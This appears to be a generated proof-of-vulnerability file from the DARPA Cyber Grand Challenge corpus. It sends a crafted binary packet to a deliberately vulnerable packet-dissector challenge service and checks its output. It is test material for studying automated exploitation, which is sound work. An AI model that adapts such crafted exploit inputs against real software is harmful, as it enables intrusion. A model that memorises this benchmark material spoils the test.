#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xb1\x6f\x19\x61"
         "\xae\x5c\xae\x57\xcb\x0c\xb3\x7a\x6b\x00\x00\x00\xbc\x61\xd4\x0f"
         "\x3d\x74\x70\xf0\xfe\x71\x2a\x67\x1c\x95\x6b\x4f\x79\x36\xcd\x7e"
         "\x77\x2e\x4f\x01\x87\x78\x83\xeb\x9b\x74\x39\xcf\x7f\x4e\x4d\x33"
         "\x8c\x6c\x7b\xca\x63\x54\xf3\xa8\x4e\x04\x94\x2e\xe0\xc7\x82\x05"
         "\x47\x75\x97\x0d\x91\x0f\xd4\x82\xbc\x1e\x0b\x46\x13\xc2\xa6\x25"
         "\x2d\x40\xcd\xce\xc2\x8c\x16\xf7\x5b\x8b\x62\xbb\xdb\x01\x0f\xa5"
         "\x24\xc5\x17\x90\xb2\xb6\x5d\x75\x96\xe1\xb7\x85\xf6\xb5\x33\x97"
         "\xad\xc5\x33\xf8\xd1\x9a\x83\x5b\x05\xc8\x3c\xd6\xd8\x97\x1c\xa1"
         "\x5b\xfd\xb5\x95\xbd\xd6\xa7\xba\xa4\x1c\x14\x49\x1d\x9c\x37\xa1"
         "\x63\xae\x53\x67\x42\x3c\x78\xf8\x0c\x4f\x98\x86\x03\x6a\x15\x4b"
         "\xc9\xf8\x9a\x59\x5c\x8b\xb0\x64\x8a\x83\xc3\xe2\xc6\x80\x7f\x54"
         "\xd1\x87\x44\x16\xa4\x92\xd7\xb8\x7d\x07\xa7\x74\x01\x08\xce\x04"
         "\x4f\x19\xc2\x67\xc0\x76\x01\xdd\x0c\x92\x70\x43\xb8\x56\x14\x6a"
         "\xc0\x61\x85\x69\x1b\x06\xe5\x2f\xf8\x1e\xf5\xa3\x81\xcf\x83\x4e"
         "\x36\xf4\x34\x8e\xf6\xa8\x76\x83\xa9\x8e\xbc\x1b\x27\xc9\x37\x89"
         "\x9b\x92\xda\x41\x08\x27\x6d\xaf\xca\xea\x30\xb3\x4a\xc7\x0b\x76"
         "\xd9\xd8\x0e\x1e\x19\x31\xef\xd1\xa2\xa8\xab\x34\xc9\xa6\x47\xf2"
         "\x58\xaf\x49\xba\x79\x51\xf1\xa2\xab\x99\xa6\xd5\xdb\xda\x7a\xdd"
         "\x29\x8e\x97\xbc\xda\x6a\x5b\xb9\xc6\x91\xcb\x1b\xd8\x95\xd5\x50"
         "\xfb\x23\x0d\x64\xb2\xe2\xb0\x95\x3d\x96\xcb\x9a\xbc\xbc\x84\xf9"
         "\x37\x43\xbf\xcd\xd8\xdf\xc1\x9d\x17\xac\x4d\x47\x06\xe0\x56\xfc"
         "\xdc\x28\x24\x57\xf0\xba\x68\x7b\x8e\x4e\x18\xc0\x7e\xc0\x36\xe2"
         "\xf5\xf8\x03\xed\xbb\x54\x9f\x37\x8b\x04\x04\x83\x63\x0d\x7c\x90"
         "\xfb\x05\x1b\x90\xc5\xae\xa8\x2d\x2a\xd1\xfe\xdb\xe9\xd0\xa7\xad"
         "\x78\x89\x06\xde\x9f\x2c\xa4\x27\xe2\x9d\x61\xc2\xeb\x60\xac\xb1"
         "\x0b\xa6\xf2\xfa\x10\x7c\x41\x20\xee\x09\x97\xe6\x0c\xd8\xf6\x1b"
         "\x32\x82\xf7\xd2\x4e\x57\x83\x6c\xc4\xa3\x41\x52\x72\x1b\xfa\xfa"
         "\x48\xea\x72\x71\xd9\xf6\xf1\x89\x82\x6b\xab\x3e\x84\x2f\xe1\x7a"
         "\x09\xc2\x3f\x7f\x02\x67\x85\x3f\xa3\xb1\xc6\x29\x39\xf7\x61\x15"
         "\xb9\x9f\xab\xcc\x64\xab\x9d\xb8\x8f\x79\x66\xfb\x58\x36\x7e\xe7"
         "\x0f\x53\xc8\x16\xee\x17\xd4\x51\x58\xf9\x88\xa7\x37\xbd\xb1\xa2"
         "\xc9\x05\x27\x54\xd0\x21\xf0\xda\x08\x7a\xf4\x4e\x5f\xf6\x75\x0b"
         "\x0b\x71\x37\xf3\xbf\xe2\xdd\x53\x36\xa4\x9b\xb0\xd9\x25\x27\x58"
         "\xdb\x52\xd4\x52\xa8\x0f\x2b\xb5\x8e\xb6\x0b\xb0\x87\xf1\xb8\x5b"
         "\x6e\xd2\xe1\x58\x7c\xf1\x56\x87\x3c\x95\x78\x2f\xc6\x68\xe0\x02"
         "\x18\x13\xe4\x14\x77\x22\xb6\x09\xeb\x67\x45\x14\x0c\x63\x60\xaf"
         "\xe4\xfc\x30\x74\xac\xcd\x15\x94\xc2\xfe\xec\xac\x54\xe9\x7d\x58"
         "\x94\xad\x92\xb0\xc6\xd6\xac\x5b\x40\xc2\x24\xee\x5b\x00\x16\xda"
         "\x5a\x7d\x3e\x59\xa0\x44\x99\x29\x4f\xd5\x63\x8a\xf0\xaa\x63\xae"
         "\x4d\x2a\x8b\x87\xa3\xb5\x57\xdc\xfa\xd0\xb3\xe0\x83\xe1\x2e\xe0"
         "\x7f\x58\x37\x92\x9e\x83\xd9\xbc\x33\xb6\xf2\xfc\x1b\x40\x96\x7b"
         "\xdb\x89\xb8\x9b\x31\xe2\x7d\xf3\x44\x10\xdd\xf6\x50\x3a\xab\xac"
         "\x51\x6f\xcd\x38\xbf\x21\x16\x85\xc8\x12\x3e\x8c\xf0\x9d\xfe\x38"
         "\x01\xb7\xa0\x71\x72\x36\xae\xa3\x97\x0a\xaa\x5c\x5a\x06\x35\x73"
         "\x59\x8d\xf3\x1c\xcd\xcc\xbc\xed\x45\x6e\x9f\xd2\xc5\x8e\x31\x67"
         "\x7d\xbd\x53\x75\xbf\x39\x51\x26\xec\xe8\xd5\xc1\x6a\x35\xcc\xbc"
         "\x88\x75\xa3\x9f\x9d\xf4\x8e\xe2\xc9\xc0\x63\x70\xc4\x38\xe8\x93"
         "\x80\xb3\x79\xe2\x8e\x98\x50\x96\x93\x09\x82\x6e\xa3\x80\x22\x14"
         "\x1c\x1f\x64\x0f\xae\xc9\x44\x83\x9c\xda\xc1\x74\x9a\xb9\x1c\xd9"
         "\x37\x55\xf5\xde\xfb\xfb\x60\x7a\x96\x9e\x5b\xc9\xb2\x16\xb4\xf2"
         "\xb1\xaf\x7f\xe1\x78\x27\x72\x86\xb1\xd2\x7a\x0e\xc2\x0c\xa2\x0c"
         "\xe2\x97\xfd\x05\x97\xac\x41\x32\x59\xb9\x23\xfd\x09\x50\xf3\x38"
         "\xef\x23\xf7\xf2\x97\x05\xaa\xd6\x59\xeb\xf5\x91\xde\x88\x95\x48"
         "\xda\x1c\x00\x05\x8f\x2a\xfe\x4d\x23\x88\x51\xa4\xac\x8a\x57\x90"
         "\xff\x5b\x5b\xb7\xe5\x90\xf7\x37\xc8\x0a\xdd\x00\x4f\xf3\x8a\x26"
         "\x85\x7c\x5a\xb6\xad\x1e\x0e\xe4\x8e\xd7\x01\x7e\x26\x14\x25\x50"
         "\xbb\x9d\x54\x9e\x87\xb8\xd9\x1c\xe2\x4b\x3a\x24\xd4\x1a\x57\x7c"
         "\xa4\xee\x60\x0d\x57\x8b\x80\xfd\x37\x09\x0c\xd3\x42\x6c\xa5\x7f"
         "\x25\x5b\x6b\x7f\x2f\x64\x64\x55\x8d\x50\x80\xe8\xb9\x54\x28\x16"
         "\x54\x1d\x54\x9b\xa9\x14\x5e\xd9\xa5\xe8\x97\x53\x81\x7b\xb0\xbd"
         "\x1d\x90\x32\x8b\x21\xe4\x80\xdb\xf9\x9c\xa1\x87\xed\x23\xa7\xc0"
         "\x2e\xdd\x1b\x09\xe7\x80\x27\x0d\xcf\xfe\xfc\x78\xa0\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===ridgeplatedisturbed
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x69\x64\x67\x65\x70\x6c\x61\x74\x65\x64"
         "\x69\x73\x74\x75\x72\x62\x65\x64";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
